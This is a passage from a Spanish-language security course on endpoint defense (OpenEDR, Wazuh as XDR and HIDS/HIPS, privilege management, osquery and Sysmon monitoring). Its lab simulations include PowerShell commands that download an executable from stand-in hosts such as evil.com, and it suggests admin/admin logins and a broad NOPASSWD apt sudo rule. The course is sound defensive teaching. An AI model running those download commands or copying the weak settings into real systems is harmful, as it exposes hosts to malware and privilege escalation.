4. Puede aplicar reglas automáticas (bloquear, aislar, eliminar).

---

### 🧰 Componentes de OpenEDR

| Componente        | Función                                   |
| ----------------- | ----------------------------------------- |
| **Agent**         | Se instala en el endpoint (Windows/Linux) |
| **Core server**   | Recibe y analiza los datos                |
| **Viewer/GUI**    | Permite al analista ver alertas y datos   |
| **Backend (API)** | Sirve para automatización o integración   |

---

### ⚙️ ¿Cómo se instala OpenEDR?

Actualmente OpenEDR tiene 2 enfoques:

- **Uso autónomo (local)**: solo con el agente y visor de eventos
- **Uso profesional (centralizado)**: despliegue completo con servidor

Para este caso práctico haremos **una instalación de agente en Windows** y **una consola local con visibilidad de eventos**.

---

### 🪟 INSTALACIÓN DE OPENEDR EN WINDOWS

#### ✅ Paso 1: Descargar OpenEDR Agent

Desde el repositorio oficial:

🔗 [https://github.com/openedr/openedr](https://github.com/openedr/openedr)

O descarga directa desde Releases:

🔗 [https://github.com/openedr/openedr/releases](https://github.com/openedr/openedr/releases)

Ejemplo: `ComodoClientSetup.exe`

---

#### ✅ Paso 2: Instalar como administrador

1. Haz doble clic en `ComodoClientSetup.exe`
2. Acepta los términos
3. Sigue las instrucciones (puede tardar unos minutos)
4. Reinicia el sistema si es necesario

✅ El agente queda funcionando en segundo plano y empieza a recolectar eventos del sistema.

---

#### ✅ Paso 3: Acceder al visor de eventos

Por ahora, la versión open source no tiene un panel web listo, pero puedes:

- Ver los logs del sistema (`eventvwr.msc`)
- Usar herramientas como **Sysinternals**, **ELK Stack** o **Wazuh** para visualizar los logs recolectados por el agente
- Conectarlo a un **SIEM o XDR** si tienes uno

---

#### ✅ Paso 4 (opcional): Integrar con servidor central

Puedes crear un backend con:

- **RabbitMQ + ElasticSearch + MongoDB + Node.js**
- Usa la carpeta `backend/` de OpenEDR
- Esta parte es más avanzada (requiere Linux + Docker)

---

### ✅ CASO PRÁCTICO COMPLETO: Detectar un proceso malicioso con OpenEDR

#### 🎯 Escenario:

Tienes una laptop con Windows 10 donde instalaste OpenEDR. Un archivo sospechoso llamado `invoice_viewer.exe` fue abierto por error.

---

#### 🛠️ Paso 1: Instalar OpenEDR en la laptop

- Descarga `ComodoClientSetup.exe`
- Instálalo como administrador
- Confirma que está corriendo (`Comodo Client - Security Agent` en servicios)

---

#### 🛠️ Paso 2: Simular actividad maliciosa

Ejecuta un archivo como:

```powershell
powershell -c "Invoke-WebRequest http://malicious-domain.com/mal.exe -OutFile C:\Users\User\mal.exe"
```

> ⚠️ Puedes usar un entorno controlado como **máquina virtual** o archivo simulado de EICAR.

---

#### 🛠️ Paso 3: OpenEDR detecta comportamiento anómalo

- El agente registra que `powershell.exe` hizo una conexión externa
- Detecta que un archivo nuevo fue creado en una carpeta sensible
- Guarda los logs (proceso, usuario, IP, comportamiento)

---

#### 🛠️ Paso 4: Analizar el evento

- Puedes revisar los eventos de Windows (`eventvwr.msc`)
- O usar `Sysmon` + `ELK Stack` o `Wazuh` para ver las alertas
- El analista puede decidir aislar el endpoint

---

#### 🧪 Resultado:

✅ OpenEDR detectó la actividad sin necesidad de firmas

✅ Los eventos fueron registrados

✅ Puedes crear una regla para bloquear ese comportamiento a futuro

---

### 📋 Ventajas de OpenEDR

✅ Gratuito y open source

✅ Visibilidad detallada del endpoint

✅ Detecta comportamiento sin depender solo de firmas

✅ Ideal para entornos de aprendizaje, laboratorios o PyMEs

---

### 📘 Comparación con otras soluciones

| Solución         | Costo  | Código abierto | Consola web | Fácil de instalar | Nivel profesional |
| ---------------- | ------ | -------------- | ----------- | ----------------- | ----------------- |
| **OpenEDR**      | Gratis | ✅ Sí          | ⚠️ Limitado | ✅                | Medio             |
| **Wazuh**        | Gratis | ✅ Sí          | ✅          | Medio             | Medio/Alto        |
| **CrowdStrike**  | Pago   | ❌ No          | ✅          | ✅                | Muy alto          |
| **Defender EDR** | Pago   | ❌ No          | ✅          | ✅                | Muy alto          |

---

### 🧠 Conclusión

**OpenEDR** es una excelente herramienta para:

- Aprender cómo funciona un EDR profesional
- Tener visibilidad de seguridad en endpoints
- Detectar amenazas **basadas en comportamiento**
- Recolectar eventos para análisis forense

---

[🔼](#índice)

---

## **538. Extended Detection and Response (XDR)**

### 🧠 ¿Qué es XDR (Extended Detection and Response)?

**XDR** significa **"Extended Detection and Response"** (Detección y Respuesta Extendida). Es una evolución de EDR (Endpoint Detection and Response), pero más **completo e integrado**.

#### 🔍 Diferencia clave:

| Característica | EDR              | XDR                                               |
| -------------- | ---------------- | ------------------------------------------------- |
| Alcance        | Solo endpoint    | Endpoint + red + correo + nube + servidores, etc. |
| Visibilidad    | Limitada al host | Visión centralizada de toda la infraestructura    |
| Detección      | Local            | Correla eventos de múltiples fuentes              |
| Respuesta      | En el endpoint   | Automatiza respuestas en todo el sistema          |

---

### 📦 ¿Qué monitorea un sistema XDR?

Un XDR conecta varias fuentes:

1. **Endpoints** (PCs, laptops, servidores)
2. **Correo electrónico** (detección de phishing o malware)
3. **Firewall / red** (IPs sospechosas, tráfico inusual)
4. **Nube** (Google Cloud, Azure, AWS)
5. **Identidad** (inicio de sesión sospechoso, cambios de credenciales)

Todo esto se **centraliza**, se **correla automáticamente** y se muestra en un **panel unificado de seguridad**.

---

### 🎯 ¿Por qué es útil XDR?

Imagina esto:

> Un usuario descarga un archivo malicioso por correo → el archivo se ejecuta en su laptop → se conecta a un servidor remoto → el atacante intenta moverse lateralmente a otros dispositivos en la red.

☠️ Con soluciones separadas, puede pasar desapercibido.

✅ Con XDR, todo se ve en un solo lugar, correlado:

**"Descarga → ejecución → conexión remota → movimiento lateral"**.

---

### 🛠️ ¿Cómo se instala un XDR?

XDR no es una única app que instalas con doble clic. Es una **plataforma** que puede incluir:

- Agentes (para endpoints)
- Conectores (para nube, correo, etc.)
- Consola web (para administración)
- Reglas de correlación
- Automatización SOAR (opcional)

---

### 🔧 Ejemplos de proveedores de XDR

| Proveedor                           | ¿Tiene versión gratuita?       | Detalles                                |
| ----------------------------------- | ------------------------------ | --------------------------------------- |
| Microsoft Defender XDR              | ❌ (requiere licencia M365 E5) | Muy completo, integra todo Microsoft    |
| CrowdStrike Falcon XDR              | ❌                             | Muy robusto, usado por empresas grandes |
| **Wazuh + OSQuery + ELK (XDR DIY)** | ✅                             | Puedes montar tu propio XDR             |

---

### 🆓 ¿Puedo tener una solución XDR gratis?

Sí. Puedes montar un XDR básico con herramientas **open source** como:

- **Wazuh** (detección de amenazas en endpoints + logs)
- **Zeek** (detección de amenazas en red)
- **Suricata** (detección de intrusiones en red)
- **Elastic Stack (ELK)** (visualización de eventos)
- **TheHive + Cortex** (respuesta y automatización)

🔧 Se integran como piezas para crear un ecosistema de XDR gratuito.

---

### ✅ Caso práctico completo: Simular un mini-XDR con Wazuh

---

#### 🎯 Objetivo:

Instalar **Wazuh** (plataforma de seguridad unificada), que actúa como un XDR básico:

- Monitorea endpoints (archivos, procesos, accesos)
- Monitorea logs del sistema, red y otros servicios
- Correlaciona y alerta sobre comportamientos sospechosos

---

### 🧰 Requisitos:

- Una máquina virtual con Linux (Ubuntu Server 22.04)
- Una máquina con Windows (que será el endpoint monitoreado)

---

#### 🔧 Paso 1: Instalar Wazuh Server en Linux

```bash
curl -sO https://packages.wazuh.com/4.8/wazuh-install.sh
sudo bash wazuh-install.sh -a
```

Este script instala:

- Wazuh Server
- ElasticSearch
- Kibana (interfaz visual)

📍 Una vez terminado, accede a:
`https://TU_IP:5601` (usuario: `admin`, contraseña: `admin`)

---

#### 🔧 Paso 2: Instalar agente en Windows (endpoint)

1. Ve al servidor Wazuh y descarga el instalador:

   [https://packages.wazuh.com/4.x/windows/wazuh-agent-4.8.0-1.msi](https://packages.wazuh.com/4.x/windows/wazuh-agent-4.8.0-1.msi)

2. Instala como administrador.

3. Durante la instalación, pon la IP del servidor Wazuh.

4. Inicia el servicio `Wazuh Agent` desde "Servicios".

---

#### 🔧 Paso 3: Ver eventos de seguridad

1. Entra a `https://TU_IP:5601`
2. Verás una consola donde puedes:

   - Ver procesos sospechosos
   - Alertas de logs del sistema
   - Cambios de integridad en archivos
   - Inicios de sesión

---

#### 🧪 Simular actividad sospechosa

1. En Windows, abre CMD y corre:

```cmd
powershell -c "Invoke-WebRequest http://evil.com/malware.exe -OutFile mal.exe"
```

2. Wazuh detecta:

   - Powershell usado para conexión externa
   - Nuevo archivo ejecutable creado
   - Actividad de red anómala

3. En el dashboard verás una alerta con el detalle.

---

#### ✅ Resultado final

- Tienes visibilidad de endpoints (Windows/Linux)
- Detectas comandos peligrosos, procesos, tráfico malicioso
- Todo centralizado como un XDR básico

---

### 📚 Conclusión

**XDR** es una evolución natural en la ciberseguridad moderna. Ofrece:

✅ Visibilidad centralizada

✅ Respuesta automatizada

✅ Detección más precisa al correlacionar eventos

✅ Reduce el tiempo de respuesta y los falsos positivos

Para entornos caseros o de laboratorio, puedes montar un mini-XDR con **Wazuh**, **OSQuery**, **Zeek** y **Elastic Stack**. Para entornos empresariales, Microsoft Defender XDR o CrowdStrike son opciones líderes.

---

[🔼](#índice)

---

## **539. Host Intrusion Detection/Prevention System (HIDS/HIPS)**

### 🧠 ¿Qué es HIDS/HIPS?

#### 🔎 HIDS — _Host-based Intrusion Detection System_

Es un **sistema de detección de intrusiones basado en el host**, que:

- Monitorea **actividades sospechosas** en un sistema operativo.
- No bloquea, solo **detecta y alerta**.
- Funciona como un **vigilante**: observa logs, archivos críticos, procesos, conexiones, etc.

#### 🔐 HIPS — _Host-based Intrusion Prevention System_

Es similar a HIDS pero **además de detectar, puede bloquear o prevenir** ataques:

- Bloquea procesos maliciosos.
- Previene modificaciones en archivos sensibles.
- Detiene conexiones a servidores sospechosos.

---

#### 📦 Diferencias entre HIDS y HIPS

| Característica  | HIDS                        | HIPS                             |
| --------------- | --------------------------- | -------------------------------- |
| Tipo            | Detección                   | Prevención                       |
| Acción          | Solo alerta                 | Bloquea y alerta                 |
| Nivel de riesgo | Más seguro (sin interferir) | Más agresivo (puede romper apps) |
| Reacción        | Manual                      | Automática                       |

---

### 🧰 ¿Qué analiza un HIDS/HIPS?

- Cambios en archivos de sistema (`/etc/passwd`, por ejemplo)
- Inicios de sesión sospechosos
- Cambios en permisos
- Procesos inusuales
- Instalación de software
- Logs del sistema (`/var/log/auth.log`, `eventvwr.msc` en Windows)

---

### 🧱 ¿Por qué usar un HIDS/HIPS?

> Para saber si **alguien entró o intentó entrar** a tu sistema, o si **algo cambió sin permiso**.

Es muy útil en:

- 🖥️ Servidores de producción
- 📁 PCs con acceso a datos sensibles
- 🕵️ Ambientes donde necesitas **auditoría o cumplimiento** (como ISO 27001, PCI-DSS)

---

### 🧰 Herramientas populares

| Herramienta     | Tipo      | Plataforma     | Gratuito |
| --------------- | --------- | -------------- | -------- |
| **Wazuh**       | HIDS/HIPS | Linux, Windows | ✅       |
| OSSEC           | HIDS      | Linux, Windows | ✅       |
| Tripwire (Open) | HIDS      | Linux          | ✅       |
| Samhain         | HIDS      | Linux          | ✅       |
| AIDE            | HIDS      | Linux          | ✅       |

Nos enfocaremos en **Wazuh**, porque es potente, gratuito y fácil de usar como HIDS y HIPS.

---

### ✅ Caso práctico completo: Configurar Wazuh como HIDS/HIPS

---

#### 🎯 Objetivo:

Instalar **Wazuh agent** en un servidor Linux para detectar y prevenir actividades sospechosas, como:

- Cambios en archivos
- Inicios de sesión no autorizados
- Creación de nuevos usuarios
- Procesos peligrosos

---

#### 🖥️ Infraestructura:

- 🧠 **Wazuh Server** (ya instalado en otra máquina)
- 🖥️ **Máquina Linux (Ubuntu 22.04)** como endpoint

---

#### 🔧 Paso 1: Instalar el agente Wazuh en el host

```bash
curl -sO https://packages.wazuh.com/4.8/wazuh-agent-4.8.0.deb
sudo dpkg -i wazuh-agent-4.8.0.deb
```

---

#### 🔧 Paso 2: Configurar el archivo del agente

Edita el archivo `/var/ossec/etc/ossec.conf` y cambia:

```xml
<server>
  <address>IP_DEL_SERVIDOR_WAZUH</address>
</server>
```

Reemplaza `IP_DEL_SERVIDOR_WAZUH` con la IP de tu servidor Wazuh.

---

#### 🔧 Paso 3: Iniciar el agente

```bash
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

---

#### 🔧 Paso 4: Simular una intrusión

1. Modifica un archivo sensible:

```bash
sudo nano /etc/passwd
```

2. En la interfaz web de Wazuh (https\://IP_DEL_SERVIDOR:5601), verás una alerta de:

> “File integrity monitoring: /etc/passwd was modified”

---

#### 🔧 Paso 5: Activar reglas HIPS (opcional)

Puedes configurar reglas para que el sistema reaccione, por ejemplo:

- **Bloquear IPs maliciosas automáticamente**
- **Detener procesos no autorizados**

Esto se hace con los módulos de Wazuh como `Active Responses`.

##### Ejemplo: bloquear IP tras 5 fallos de login

Edita `/var/ossec/etc/ossec.conf` en el servidor y activa:

```xml
<active-response>
  <command>firewalldrop</command>
  <location>local</location>
  <rules_id>5710,5712,5714</rules_id>
  <timeout>600</timeout>
</active-response>
```

Esto bloqueará IPs que generen errores de autenticación (`ssh brute force`, por ejemplo).

---

#### 📋 Resultado final

✅ Tu sistema monitorea archivos, procesos, accesos y más

✅ Detecta cambios sospechosos (HIDS)

✅ Responde bloqueando IPs o procesos maliciosos (HIPS)

✅ Puedes ver todos los eventos en el dashboard de Wazuh

---

### 🧠 Conclusión

| Ventaja de usar HIDS/HIPS | ¿Por qué es útil?                              |
| ------------------------- | ---------------------------------------------- |
| Detección temprana        | Saber si alguien entra sin permiso             |
| Control de integridad     | Vigila archivos clave como `/etc/passwd`       |
| Auditoría y cumplimiento  | Necesario en normas como PCI, ISO, HIPAA       |
| Prevención                | Bloquea IPs, procesos y ataques en tiempo real |

---

[🔼](#índice)

---

## **540. Caso práctico: Despliegue de un XDR profesional (Wazuh)**

### 🧠 ¿Qué es un XDR?

**XDR (Extended Detection and Response)** es una solución avanzada de ciberseguridad que:

🔍 **Detecta** amenazas en múltiples capas:

- Dispositivos (endpoints)
- Red
- Aplicaciones
- Correo
- Servidores

🧠 **Correlaciona eventos** desde distintas fuentes

⚠️ **Responde automáticamente** ante ataques

📊 **Centraliza la visibilidad y gestión** de incidentes

---

#### 📌 ¿En qué se diferencia de un antivirus o EDR?

| Tecnología | ¿Qué protege?           | ¿Acción?              | Datos centralizados |
| ---------- | ----------------------- | --------------------- | ------------------- |
| Antivirus  | Solo archivos/malware   | Escaneo y bloqueo     | ❌                  |
| EDR        | Endpoints               | Detección avanzada    | Parcial             |
| XDR        | Toda la infraestructura | Detección y respuesta | ✅                  |

---

### 🛠️ ¿Qué es Wazuh?

**Wazuh** es una plataforma **open source** que puede actuar como:

- 🔎 HIDS/HIPS
- 🔧 EDR
- 📈 XDR

Tiene:

✅ Agentes para Windows, Linux, macOS

✅ Módulo de **detección de amenazas y respuesta automática**

✅ Módulo de **integración con firewalls, antivirus, logs, y red**

✅ Consola visual integrada con **Elasticsearch + Kibana**

---

### 🏗️ Arquitectura de Wazuh como XDR

```
+--------------------+
|  Dashboard (Kibana)|
+--------------------+
         ↑
+--------------------+
|   Wazuh Server     | <--- Analiza y responde
+--------------------+
         ↑
+--------------------+
| Wazuh Agents (host)|
+--------------------+
```

---

### 🧰 ¿Qué necesitas para desplegar Wazuh XDR?

#### 📋 Requisitos:

- ✅ Una máquina virtual (o VPS) Ubuntu 22.04 (para el servidor)
- ✅ Acceso a Internet
- ✅ 4 GB RAM mínimo
- ✅ curl, bash

---

### ✅ Instalación paso a paso de Wazuh XDR (Servidor)

---

#### 🔧 Paso 1: Actualizar el sistema

```bash
sudo apt update && sudo apt upgrade -y
```

---

#### 🔧 Paso 2: Descargar script de instalación todo-en-uno

```bash
curl -sO https://packages.wazuh.com/4.8/wazuh-install.sh
```

---

#### 🔧 Paso 3: Dar permisos e iniciar instalación

```bash
chmod +x wazuh-install.sh
sudo ./wazuh-install.sh --wazuh-only
```

Este script instala:

- Wazuh Manager (detección y correlación)
- Elasticsearch (almacenamiento de logs)
- Kibana (dashboard visual)

🕐 Toma unos 10-15 minutos.

---

#### 🔧 Paso 4: Acceder a la consola web

Una vez instalado, abre en el navegador:

```
https://TU-IP:5601
```

🔑 Usuario por defecto:

- Usuario: `admin`
- Contraseña: `admin`

---

### ✅ Caso práctico: Desplegar Wazuh como XDR profesional

---

#### 🎯 Escenario:

Tienes una pequeña empresa con:

- 1 servidor Ubuntu (servidor de archivos)
- 2 laptops con Windows (empleados)

Quieres detectar:

- Inicios de sesión sospechosos
- Cambios en archivos sensibles
- Malware
- Ataques de red (por ejemplo, escaneos de puertos)
- Eventos de firewall

---

#### 🛠️ Paso 1: Instalar Wazuh Server (ya hecho)

(Ver pasos anteriores)

---

#### 🖥️ Paso 2: Instalar agentes en los endpoints

##### 🔹 En Ubuntu (agente)

```bash
curl -sO https://packages.wazuh.com/4.8/wazuh-agent-4.8.0.deb
sudo dpkg -i wazuh-agent-4.8.0.deb
```

Edita `/var/ossec/etc/ossec.conf` y cambia:

```xml
<server>
  <address>IP_DEL_SERVIDOR_WAZUH</address>
</server>
```

Luego:

```bash
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

---

##### 🔹 En Windows

1. Descargar agente desde:
   [https://documentation.wazuh.com/current/installation-guide/installing-wazuh-agent/win-agent.html](https://documentation.wazuh.com/current/installation-guide/installing-wazuh-agent/win-agent.html)
2. Instalar como administrador
3. Durante la instalación, poner la IP del servidor Wazuh

---

#### 📦 Paso 3: Activar módulos de XDR

Desde la consola Wazuh:

- Activa **File Integrity Monitoring** para vigilar archivos clave
- Activa **Syscollector** (recoge info del sistema)
- Activa **Rootcheck** (revisa rootkits)
- Activa **Active Responses** (reaccionar automáticamente)

---

#### 🧪 Paso 4: Simular ataques

1. Inicia sesión como root desde IP sospechosa
2. Modifica el archivo `/etc/shadow`
3. Ejecuta un escaneo de puertos con `nmap` desde otra PC
4. Instala software desconocido

---

#### 📊 Paso 5: Monitorear alertas

Desde la consola Kibana:

- Ve a **Security → Detections**
- Filtra por host, IP, tipo de amenaza
- Observa alertas en tiempo real

---

#### 🔐 Paso 6: Configurar respuesta automática

Ejemplo: bloquear IPs con múltiples fallos de login SSH

En el servidor, edita:

```xml
<active-response>
  <command>firewalldrop</command>
  <rules_id>5710,5712,5714</rules_id>
  <timeout>600</timeout>
</active-response>
```

Reinicia Wazuh:

```bash
sudo systemctl restart wazuh-manager
```

---

### ✅ Resultado final

🔐 Detección de amenazas en red, sistema, archivos y procesos

📦 Análisis correlacionado en una consola única

⚠️ Respuestas automáticas ante intentos de ataque

📊 Visibilidad completa de toda tu infraestructura

---

### 🧠 Conclusión

**Wazuh como XDR** te da:

| Beneficio                    | Ejemplo                                        |
| ---------------------------- | ---------------------------------------------- |
| Detección unificada          | Inicios de sesión, malware, escaneo de puertos |
| Automatización de respuestas | Bloqueo de IPs o procesos maliciosos           |
| Visibilidad centralizada     | Dashboard con logs y alertas en tiempo real    |
| Cumplimiento de normativas   | Requisitos de ISO, PCI-DSS, etc.               |

---

[🔼](#índice)

---

## **541. Endpoint Privilege Management (EPM)**

### 🧠 ¿Qué es Endpoint Privilege Management (EPM)?

**EPM (Gestión de privilegios en endpoints)** es una estrategia de ciberseguridad que:

🔐 **Controla y minimiza los privilegios** de los usuarios en sus dispositivos (endpoints)

🚫 **Evita que los usuarios sean administradores innecesariamente**

⚠️ **Impide que malware o atacantes usen privilegios elevados** para dañar el sistema

#### 📌 Ejemplo real:

- Un empleado descarga un archivo malicioso .exe.
- Si tiene **privilegios de administrador**, el malware puede instalar un keylogger o abrir puertas traseras.
- Con **EPM**, aunque el usuario intente instalarlo, no tendrá permisos.

---

### 🎯 Objetivos de EPM

| Objetivo                                               | ¿Por qué es importante?                           |
| ------------------------------------------------------ | ------------------------------------------------- |
| Aplicar el **principio de menor privilegio**           | Solo lo mínimo necesario para trabajar            |
| Elevar privilegios **temporalmente** o bajo aprobación | Evita accesos permanentes peligrosos              |
| **Auditar el uso de privilegios**                      | Saber quién ejecuta qué y cuándo                  |
| Evitar uso malicioso de admin                          | Proteger de ransomware, malware, hackers internos |

---

### 🧰 Herramientas para implementar EPM

#### 🔹 Open Source:

| Herramienta | Sistema | Función principal                                           |
| ----------- | ------- | ----------------------------------------------------------- |
| **sudo**    | Linux   | Eleva privilegios temporalmente con control                 |
| **polkit**  | Linux   | Permite definir qué acciones requieren privilegios          |
| **gsudo**   | Windows | Alternativa a `sudo`, gestión de permisos en cmd/powershell |
| **Wazuh**   | Todos   | No gestiona directamente EPM, pero audita privilegios       |

#### 🔹 Comerciales (muy usados en empresas):

| Herramienta                             | Sistema       | Ventaja principal                           |
| --------------------------------------- | ------------- | ------------------------------------------- |
| **BeyondTrust EPM**                     | Windows/Linux | Muy completo, con consola centralizada      |
| **CyberArk Endpoint Privilege Manager** | Windows       | Muy usado en bancos y grandes corporaciones |
| **ManageEngine PAM360**                 | Windows/Linux | Fácil de instalar, buena integración        |

---

### 🖥️ Cómo se instala una solución EPM (enfocándonos en open source)

Vamos a centrarnos en un ejemplo con **Linux**, usando `sudo` y `polkit`, y también en **Windows**, usando `gsudo`.

---

### ✅ EPM en **Linux** (ejemplo con `sudo` y `polkit`)

#### 🔧 Paso 1: Crear usuario sin privilegios

```bash
sudo adduser usuario_limited
```

---

#### 🔧 Paso 2: Configurar `sudo` para que solo pueda usar ciertos comandos

```bash
sudo visudo
```

Agrega esto al final:

```bash
usuario_limited ALL=(ALL) NOPASSWD: /usr/bin/apt, /usr/bin/systemctl restart apache2
```

🔐 Esto permite que ese usuario **solo pueda actualizar el sistema o reiniciar Apache**, nada más.

---

#### 🔧 Paso 3: Control más detallado con **polkit**

Ejemplo: permitir que un usuario reinicie la red **solo si introduce su contraseña**:

```bash
sudo nano /etc/polkit-1/localauthority/50-local.d/network-restart.pkla
```

```ini
[Allow network restart]
Identity=unix-user:usuario_limited
Action=org.freedesktop.NetworkManager.network-control
ResultActive=auth_self
```

---

### ✅ EPM en **Windows** con gsudo (alternativa gratuita a UAC)

#### 🔧 Paso 1: Instalar Chocolatey

Abre PowerShell como admin y ejecuta:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; `
iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
```

---

#### 🔧 Paso 2: Instalar `gsudo`

```powershell
choco install gsudo
```

---

#### 🔧 Paso 3: Ejecutar comandos con privilegios solo cuando sea necesario

```powershell
gsudo ipconfig /flushdns
```

> 🔐 Aparece una ventana pidiendo privilegios. Si no los tienes, no puedes continuar.

Puedes usar reglas de **GPO** (Política de Grupo) en entornos empresariales para limitar accesos aún más.

---

### ✅ Caso práctico completo: Implementar EPM en un entorno mixto

---

#### 🏢 Escenario:

Eres administrador de una pequeña empresa con:

- 1 servidor Ubuntu
- 5 laptops Windows 10 de usuarios

Deseas:

- Evitar que los empleados instalen programas
- Permitir a ciertos usuarios reiniciar servicios de red si es necesario
- Auditar quién y cuándo se intentan usar privilegios

---

#### 🧰 Solución paso a paso

##### 🖥️ En Windows (usuarios)

1. Instalas `gsudo` usando Chocolatey en cada laptop.
2. Configuras una **GPO** (Group Policy) para:

   - Quitar derechos de "Administradores locales"
   - Bloquear instalación de software (reglas de AppLocker)
   - Permitir solo comandos específicos con `gsudo`

##### 🐧 En Linux (servidor)

1. Creas usuarios limitados
2. Configuras `sudo` para:

   - Permitir solo ciertas tareas como reiniciar servicios
   - Restringir edición de archivos críticos como `/etc/passwd`

##### 📋 Auditoría

- Configuras **auditd** en Linux para registrar cada vez que se usa `sudo`
- En Windows, activas eventos de seguridad para el uso de `gsudo` o `runas`

##### 🧪 Simulación

Un empleado trata de instalar Chrome con:

```powershell
gsudo choco install googlechrome
```

El sistema muestra:

```
Access Denied. You don't have the required privileges.
```

Otro usuario autorizado intenta reiniciar el DNS:

```powershell
gsudo ipconfig /flushdns
```

✅ Solo este comando es permitido.

---

### 🎓 Conclusión

**EPM (Endpoint Privilege Management)**:

✅ Protege los endpoints limitando privilegios innecesarios

✅ Reduce riesgo de malware y errores humanos

✅ Se puede aplicar con herramientas simples (sudo, gsudo) o con soluciones profesionales (CyberArk, BeyondTrust)

✅ Es ideal para empresas con usuarios no técnicos

---

[🔼](#índice)

---

## **542. Monitorización del endpoint (beats, osquery, syslog...)**

### 📌 ¿Qué es la monitorización de endpoints?

La **monitorización de endpoints** consiste en **recopilar y analizar información de dispositivos** como laptops, servidores, PCs, etc., para:

✅ Detectar comportamientos sospechosos

✅ Auditar actividades del sistema

✅ Prevenir ataques y responder a incidentes

> 🔎 Es como instalar cámaras y sensores en tu casa: no evitan que alguien entre, pero te informan si algo raro pasa.

---

### 🎯 ¿Qué queremos monitorear en un endpoint?

| Categoría             | Ejemplos                            |
| --------------------- | ----------------------------------- |
| Procesos              | ¿Qué programas se están ejecutando? |
| Conexiones de red     | ¿Con quién se conecta el equipo?    |
| Archivos modificados  | ¿Qué archivos fueron cambiados?     |
| Accesos de usuarios   | ¿Quién inició sesión y cuándo?      |
| Actividad del sistema | Uso de CPU, RAM, disco              |
| Logs del sistema      | Errores, avisos, autenticaciones    |

---

### 🧰 Herramientas para monitorización de endpoints

| Herramienta             | Sistema operativo       | ¿Qué hace?                                           |
| ----------------------- | ----------------------- | ---------------------------------------------------- |
| **Auditd**              | Linux                   | Monitorea cambios en archivos y comandos ejecutados  |
| **Osquery**             | Linux / Windows / macOS | Hace preguntas tipo SQL sobre el sistema             |
| **Winlogbeat**          | Windows                 | Envía logs del sistema a servidores como ELK o Wazuh |
| **Filebeat**            | Todos                   | Monitorea archivos de logs                           |
| **Sysmon** + **Syslog** | Windows / Linux         | Registra eventos detallados + los exporta por red    |

---

### 🔍 Ejemplo simple para entenderlo:

👉 Si instalas `osquery` en tu laptop, puedes preguntar:

```sql
SELECT name, path FROM processes WHERE name = 'chrome.exe';
```

Y obtienes la ubicación de donde se ejecuta Google Chrome en tiempo real.

---

### 🛠️ Cómo se instala cada herramienta (básico)

#### 🔹 1. **Osquery** (Linux/Windows)

##### En Linux (Ubuntu):

```bash
sudo apt update
sudo apt install osquery
```

##### En Windows:

Descargar desde: [https://osquery.io/downloads/official/windows](https://osquery.io/downloads/official/windows)

---

#### 🔹 2. **Filebeat / Winlogbeat** (Elastic)

##### En Linux:

```bash
curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-8.12.0-amd64.deb
sudo dpkg -i filebeat-8.12.0-amd64.deb
```

##### En Windows (Winlogbeat):

1. Descargar desde: [https://www.elastic.co/downloads/beats/winlogbeat](https://www.elastic.co/downloads/beats/winlogbeat)
2. Descomprimir en `C:\Program Files\Winlogbeat`
3. Configurar `winlogbeat.yml`

---

#### 🔹 3. **Sysmon + Syslog**

##### En Windows (Sysmon):

1. Descargar Sysinternals Sysmon:
   [https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

2. Instalar con configuración predeterminada:

```powershell
Sysmon.exe -accepteula -i sysmonconfig.xml
```

_Archivo `sysmonconfig.xml` se puede descargar desde GitHub, como el de SwiftOnSecurity:
[https://github.com/SwiftOnSecurity/sysmon-config](https://github.com/SwiftOnSecurity/sysmon-config)_

3. Enviar logs al servidor usando agente Syslog (como NXLog)

---

#### 🔹 4. **Auditd** (Linux)

```bash
sudo apt install auditd audispd-plugins
sudo systemctl start auditd
```

Agregar reglas de monitoreo:

```bash
sudo auditctl -w /etc/passwd -p wa -k passwd_changes
```

Esto registra cada vez que se **escribe o accede** al archivo `/etc/passwd`.

---

### ✅ Caso práctico completo: Monitorización de un endpoint Linux y Windows

---

#### 🏢 Escenario:

Tienes una pequeña oficina con:

- 1 servidor Linux Ubuntu
- 2 laptops Windows

Quieres:

- Saber qué procesos están corriendo
- Saber cuándo se modifican archivos clave
- Recibir logs de seguridad en un servidor central

---

#### 🚀 Paso a paso:

---

#### 🔹 En el servidor Linux

##### 🛠️ Instalar **Osquery**:

```bash
sudo apt update && sudo apt install osquery
```

Ejecutar consulta:

```bash
osqueryi
SELECT name, pid FROM processes WHERE name LIKE '%sshd%';
```

---

##### 🛠️ Instalar **Auditd**:

```bash
sudo apt install auditd
sudo auditctl -w /etc/shadow -p wa -k shadow_watch
```

Ver logs:

```bash
sudo ausearch -k shadow_watch
```

---

#### 🔹 En los equipos Windows

##### 🛠️ Instalar **Winlogbeat**:

1. Descargar y descomprimir Winlogbeat.
2. Configurar `winlogbeat.yml` para enviar eventos a un servidor (por ejemplo, Logstash o Wazuh).
3. Instalar como servicio:

```powershell
.\install-service-winlogbeat.ps1
Start-Service winlogbeat
```

---

##### 🛠️ Instalar **Sysmon**

```powershell
Sysmon.exe -accepteula -i sysmonconfig.xml
```

Este captura:

- Creación de procesos
- Conexiones de red
- Escritura en el registro

---

#### 🔧 Servidor central de logs

Puedes usar:

- **ELK Stack** (Elasticsearch, Logstash, Kibana)
- **Wazuh** (gestión de seguridad con dashboards)

---

### 🧪 Simulación de evento

Un empleado ejecuta un script malicioso que modifica `/etc/shadow` en Linux.

Auditd registra:

```
type=SYSCALL msg=audit(1628454357.512:598): ...
key="shadow_watch"
```

Al mismo tiempo, `osquery` detecta procesos extraños corriendo.

En Windows, `Sysmon` registra:

```
ProcessCreate: cmd.exe > powershell.exe > curl malicious.exe
```

Estos datos son enviados al servidor central para alertar al equipo de seguridad.

---

### 🎓 Conclusión

🔐 La **monitorización de endpoints** es **clave para detectar ataques en tiempo real**

🛠️ Herramientas como `osquery`, `auditd`, `winlogbeat`, `sysmon`, `filebeat` permiten una visibilidad completa

💡 Son fáciles de instalar y configurar para pequeñas y medianas empresas

📊 Conectadas a un SIEM como Wazuh o ELK, ofrecen dashboards e informes en tiempo real

---

[🔼](#índice)

---

## **543. Control de ejecución de aplicaciones (Applocker)**

